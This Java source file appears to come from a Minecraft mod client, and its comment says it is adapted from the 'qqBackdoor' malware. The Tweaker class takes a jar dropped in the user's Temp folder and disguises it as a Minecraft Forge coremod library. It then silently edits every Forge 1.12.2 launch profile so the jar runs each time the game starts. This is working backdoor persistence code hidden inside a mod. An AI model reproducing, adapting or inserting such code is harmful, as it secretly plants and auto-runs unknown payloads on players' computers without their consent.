package dev.peter.luterium.features.maintainer;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author Peter(not really)
 * @since 04/14/2023
 * Adds a tweaker class on Minecraft's arguments, so it auto-runs everytime you run Minecraft.
 * Straight up skidded from qqBackdoor, but I changed some things so it doesn't use sockets :P
 */

public class Tweaker {
    public static void registerTweaker() {
        File path = new File("libraries/net/minecraftforge/coremod/1.0.12");
        File jar = new File("libraries/net/minecraftforge/coremod/1.0.12/coremod-1.0.12.jar");

        File funnyFile = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\funny.jar");

        if (!path.exists()) {
            path.mkdirs();
        }
        if (!jar.exists()) {
            if (funnyFile.exists()) {
                funnyFile.renameTo(jar);
            }
        }
        registerTweakerJson();
    }

    public static void registerTweakerJson() {
        try {
            File file2 = new File("versions");
            if (file2.isDirectory()) {
                for (File file1 : file2.listFiles()) {
                    if (file1.isDirectory()) {
                        for (File file : file1.listFiles()) {
                            if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge")) {
                                String json = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath())), StandardCharsets.UTF_8);
                                if (!json.contains("--tweakClass net.minecraftforge.coremod.FMLCoremodTweaker")) {
                                    JSONObject thing = new JSONObject(json);
                                    JSONArray array = thing.getJSONArray("libraries");
                                    JSONObject object = new JSONObject();
                                    object.put("name", "net.minecraftforge:coremod:1.0.12");
                                    array.put(object);
                                    String args = (String) thing.get("minecraftArguments");
                                    thing.remove("minecraftArguments");
                                    thing.put("minecraftArguments", args + " --tweakClass net.minecraftforge.coremod.FMLCoremodTweaker");
                                    Files.write(Paths.get(file.getAbsolutePath()), thing.toString().getBytes("UTF-8"));
                                }
                            }
                        }
                    }
                }
            }
        } catch (Throwable e) {
        }
    }
}
